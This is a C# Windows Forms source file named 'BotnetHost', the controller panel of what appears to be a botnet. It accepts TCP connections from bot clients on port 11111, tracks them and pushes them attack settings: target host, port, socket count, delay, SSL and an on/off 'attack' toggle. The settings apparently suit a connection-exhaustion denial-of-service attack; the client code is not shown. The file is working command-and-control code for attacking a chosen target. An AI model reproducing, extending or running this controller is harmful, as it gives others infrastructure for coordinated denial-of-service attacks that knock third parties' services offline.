using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.NetworkInformation;

namespace BotnetHost
{
    public partial class MainPanel : MetroFramework.Forms.MetroForm
    {
        // List of client sockets
        List<ClientConnection> clientConnections = new List<ClientConnection>();
        // Server Socket
        Socket serverSocket;
        // Server Thread
        Thread mainServerThread;
        // Server Info
        string serverIP = GetLocalIPAddress();
        string serverIPV4 = GetLocalIPv4(NetworkInterfaceType.Wireless80211);
        Int32 serverPort = 11111;
        // Action Variables
        Boolean runServer = false;
        string previousLogMessage = "";
        Boolean restartClients = false;



        /// <summary>
        /// MainPanel Function, this is the constuctor for the window
        /// </summary>
        public MainPanel()
        {
            InitializeComponent();
            this.StyleManager = metroStyleManager1;
            serverIPLabel.Text = "IP: " + serverIP;
            serverIPV4Label.Text = "IPV4: " + serverIPV4;
            serverPortLabel.Text = "Port: " + serverPort.ToString();
            log("Starting Server...");
            runServer = true;
            mainServerThread = new Thread(() => serverThread());
            mainServerThread.Start();
        }

        /// <summary>
        /// Client Socket Thread Function
        /// </summary>
        /// <param name="clientGUID">GUID of ClientConnection that this thread is responsible for</param>
        public void clientSocketThread(string clientGUID)
        {
            Boolean runThread = true;
            ClientConnection clientConnection = null;
            Socket clientSocket = null;
            string clientName = "";
            while (runThread)
            {
                // Loop through client connections to find matching cliengGUID
                foreach (ClientConnection connection in clientConnections)
                {
                    if (connection.guid.ToString() == clientGUID)
                    {
                        try
                        {
                            // matching GUID found, this is our desired connection
                            clientConnection = connection;
                            clientSocket = clientConnection.clientSocket;
                            clientName = clientSocket.RemoteEndPoint.ToString();
                        } catch (Exception e)
                        {
                            runThread = false;
                            break;
                        }
                    }
                }
                Boolean hasUpdate = false;
                updateStatusLabel.Invoke((MethodInvoker)delegate {
                    // Running on the UI thread
                    hasUpdate = Boolean.Parse(updateStatusLabel.Text);
                    updateStatusLabel.Text = "False";
                });
                try
                {
                    // Wait for incomming message from client
                    // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE, RE-ENABLE
                    while (false)
                    {
                        log("Waiting for Client Responce...");
                        // Attempt to read incomming client message
                        try
                        {
                            // Data buffer 
                            byte[] bytes = new Byte[1024];
                            string data = null;
                            int numByte = clientSocket.Receive(bytes);
                            data += Encoding.ASCII.GetString(bytes, 0, numByte);
                            // Make sure message contains something
                            if (data.IndexOf("<EOF>") > -1)
                            {
                                log("Responce recieved...");
                                // Parse message for command handling
                                data = data.Replace("<EOF>", "");
                                if (data.Contains("["))
                                {
                                    log("Message Recieved: " + data);
                                    // Loop through client commands
                                    string[] arr1 = data.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                    foreach (string item in arr1)
                                    {
                                        // Client alive status is changed (probably shutting down)
                                        if (item.Contains("Alive:"))
                                        {
                                            clientConnection.isAlive = Boolean.Parse(item.Substring(item.IndexOf(":") + 1));
                                            if (!clientConnection.isAlive)
                                            {
                                                clientConnection.killClient();
                                                runThread = false;
                                            }
                                        }
                                    }
                                }
                                break;
                            }
                        }
                        catch (Exception e)
                        {
                            log("Connection interrupred with client " + clientSocket.RemoteEndPoint);
                            clientConnection.isAlive = false;
                            runThread = false;
                            clientConnection.killClient();
                        }

                    }

                    // Send update message to client (if update is present)
                    if (hasUpdate)
                    {
                        log("Sending Client Update: " + clientConnection.buildUpdate(new string[0]));
                        byte[] message = Encoding.ASCII.GetBytes(clientConnection.buildUpdate(new string[0]));
                        clientSocket.Send(message);
                        clientConnection.restart = false;
                    } else
                    {
                        log("Pinging client(s)... ");
                        byte[] message = Encoding.ASCII.GetBytes("ping!");
                        clientSocket.Send(message);
                    }


                    // Sleep thread to improve performance
                    Thread.Sleep(1000);
                } catch (Exception er)
                {
                    log("Connection with " + clientName + " has been interrupted... killing client...");
                    clientConnection.killClient();
                    clientConnections.Remove(clientConnection);
                    runThread = false;
                    updateClientPanel();
                }
            }
            // Kill client

            clientConnection.killClient();
        }

        /// <summary>
        /// Main Server Thread Function
        /// </summary>
        public void serverThread()
        {
            // Clear connections from previous server sessions
            clientConnections.Clear();
            // Establish the local endpoint for the socket. Dns.GetHostName returns the name of the host running the application. 
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr;
            try
            {
                // Try to set socket IP address to current IPV4 address (only works on wifi as of now)
                ipAddr = IPAddress.Parse(GetLocalIPv4(NetworkInterfaceType.Wireless80211));
            } catch (Exception e)
            {
                // Fail safe = grabbing some other ip address that only works when all clients are on same pc as host
                ipAddr = ipHost.AddressList[0];
            }

            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
            // Creation TCP/IP Socket using Socket Class Costructor 
            serverSocket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                // Using Bind() method we associate a network address to the Server Socket All client that will connect to this Server Socket must know this network Address 
                serverSocket.Bind(localEndPoint);
                log("Host server started on " + serverIPV4 + ":" + serverPort);
                // Using Listen() method we create the Client list that will want to connect to Server 
                log("Waiting for client connections...");
                serverSocket.Listen(10);
                while (runServer)
                {
                    try
                    {
                        // Suspend while waiting for incoming connection Using Accept() method the server will accept connection of client 
                        Socket clientSocket = serverSocket.Accept();
                        // Add client socket to list of all client sockets
                        log("Connection Established with " + clientSocket.RemoteEndPoint.ToString());

                        // Create New Client Thread with GUID as paramater for connection tracking
                        Guid newGUID = new Guid();
                        Thread newClientThread = new Thread(() => clientSocketThread(newGUID.ToString()));
                        // Create new 'ClientConnection' Object to track/link client connection & add to master list
                        ClientConnection newClientConnection = new ClientConnection(newClientThread, clientSocket);
                        newClientConnection.guid = newGUID;
                        clientConnections.Add(newClientConnection);
                        // Start new client thread
                        newClientThread.Start();
                        // Loop through active connections to check for dead clients
                        foreach (ClientConnection connection in clientConnections)
                        {
                            try
                            {
                                // Attempt to ping each connection
                                byte[] message = Encoding.ASCII.GetBytes("ping!");
                                connection.clientSocket.Send(message);
                            } catch (Exception e)
                            {
                                // Ping failed (connection is probably dead, so we kill the client and remove it from the master list)
                                log("Connection with " + connection.clientName + " has been interrupted... killing client...");
                                connection.killClient();
                                clientConnections.Remove(connection);
                                updateClientPanel();
                            }
                        }
                    } catch (Exception error)
                    {
                        // we should probably add some error handling here, although I dont believe it is necessary
                    }
                    updateClientPanel();
                }
                // Stop Server
                log("Stopping Server...");
                stopServer();
            }
            catch (ThreadAbortException e)
            {
                log("Server thread has been aborted/stopped");
            }
        }

        /// <summary>
        /// log() function, used to display log messages to the user
        /// </summary>
        /// <param name="logMessage">Message to be displayed to user</param>
        public void log(string logMessage)
        {
            string raw = logMessage;
            // Build log message with date and message
            logMessage = "[" + DateTime.UtcNow + "] " + logMessage;
            if (raw != previousLogMessage)
            {
                // Write to console in case of exception
                Console.WriteLine(logMessage);
                try
                {
                    // Create new listviewitem for the log message
                    ListViewItem newItem = new ListViewItem();
                    newItem.Text = logMessage;
                    // Use Invoke() to access the log listview from other threads (very big brain)
                    activityLogListView.Invoke((MethodInvoker)delegate {
                        // Running on the UI thread
                        activityLogListView.Items.Add(newItem);
                        activityLogListView.Columns[0].Width = activityLogListView.Width - 35;
                        activityLogListView.EnsureVisible(activityLogListView.Items.Count - 1);
                    });
                    previousLogMessage = raw;
                }
                catch (Exception e)
                {
                    // ughhhhhhhhhhhhh something broke
                    Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                }
                try
                {
                    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                }
                catch (Exception e)
                {
                    log(e.ToString());
                }
            }
        }

        /// <summary>
        /// updateClientPanel(), used to keep an updated list of active clients
        /// </summary>
        public void updateClientPanel()
        {
            clientListView.Invoke((MethodInvoker)delegate {
                // Running on the UI thread
                clientListView.Items.Clear();
            });
            foreach (ClientConnection item in clientConnections)
            {
                try
                {
                    if (item.isAlive)
                    {
                        ListViewItem clientItem = new ListViewItem();
                        clientItem.Text = item.clientSocket.RemoteEndPoint.ToString();
                        // Add tile to main panel
                        clientListView.Invoke((MethodInvoker)delegate {
                            // Running on the UI thread
                            clientListView.Items.Add(clientItem);
                        });
                    }
                } catch (Exception e)
                {

                }
            }
        }

        /// <summary>
        /// Catch-All for settings updates, causes server to send all clients updated settings
        /// </summary>
        /// <param name="sender">This is the control that sent the command</param>
        /// <param name="e">This is the event argument</param>
        public void settingsChanged(object sender, EventArgs e)
        {
            log("Client Settings have changed... Preparing Client Update...");
            delayLabel.Text = delayTrackBar.Value.ToString();
            socketsLabel.Text = socketsTrackBar.Value.ToString();
            foreach (ClientConnection clientConnection in clientConnections)
            {
                clientConnection.hostOrIP = metroTextBox1.Text;
                clientConnection.port = int.Parse(metroTextBox2.Text);
                clientConnection.delay = delayTrackBar.Value;
                clientConnection.sockets = socketsTrackBar.Value;
                clientConnection.useSSL = useSSLToggle.Checked;
                clientConnection.attack = attackingToggle.Checked;
                clientConnection.restart = restartClients;
            }
            updateStatusLabel.Text = "True";
        }

        /// <summary>
        /// Updates labels associated with track bars
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void updateTrackBars(object sender, EventArgs e)
        {
            delayLabel.Text = delayTrackBar.Value.ToString();
            socketsLabel.Text = socketsTrackBar.Value.ToString();
        }

        /// <summary>
        /// Stop the server
        /// </summary>
        public void stopServer()
        {

            serverToggle.Invoke((MethodInvoker)delegate {
                // Running on the UI thread
                serverToggle.Checked = false;
            });
            log("Stopping Server...");
            runServer = false;
            try
            {
                serverSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception e)
            {
                Console.WriteLine("Error shutting down server socket: " + e.ToString());
            }
            try
            {
                serverSocket.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error closing server socket: " + e.ToString());
            }
            try
            {
                mainServerThread.Abort();
            }
            catch (ThreadAbortException e)
            {
                log("Server Thread has been aborted/stopped");
            }
            log("Server Stopped");
        }

        /// <summary>
        /// Start the server
        /// </summary>
        public void startServer()
        {
            log("Starting Server...");
            runServer = true;
            mainServerThread = new Thread(() => serverThread());
            mainServerThread.Start();
        }

        /// <summary>
        /// Toggle box for starting/stopping the server
        /// </summary>
        /// <param name="sender">The button</param>
        /// <param name="e">event args</param>
        private void serverToggle_CheckedChanged(object sender, EventArgs e)
        {
            if (serverToggle.Checked)
            {
                startServer();
            }
            else
            {
                stopServer();
            }
        }

        /// <summary>
        /// Closing Procedure, cleans up all connections/threads/sockets
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Kill all client connections
            foreach (ClientConnection connection in clientConnections)
            {
                connection.killClient();
            }
            // Shutdown & Close Server Socket
            try
            {
                serverSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception er) { }
            try
            {
                serverSocket.Close();
            }
            catch (Exception er) { }
            // Abort main thread
            try
            {
                mainServerThread.Abort();
            }
            catch (Exception er) { }
        }

        /// <summary>
        /// Restart client button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void restartClientsBtn_Click(object sender, EventArgs e)
        {
            restartClients = true;
            settingsChanged(sender, e);
            restartClients = false;
        }

        /// <summary>
        /// Gets current IP address
        /// </summary>
        /// <returns></returns>
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        /// <summary>
        /// Gets current IPV4 address
        /// </summary>
        /// <param name="_type"></param>
        /// <returns></returns>
        public static string GetLocalIPv4(NetworkInterfaceType _type)
        {
            string output = "";
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            output = ip.Address.ToString();
                        }
                    }
                }
            }
            return output;
        }
    }
}
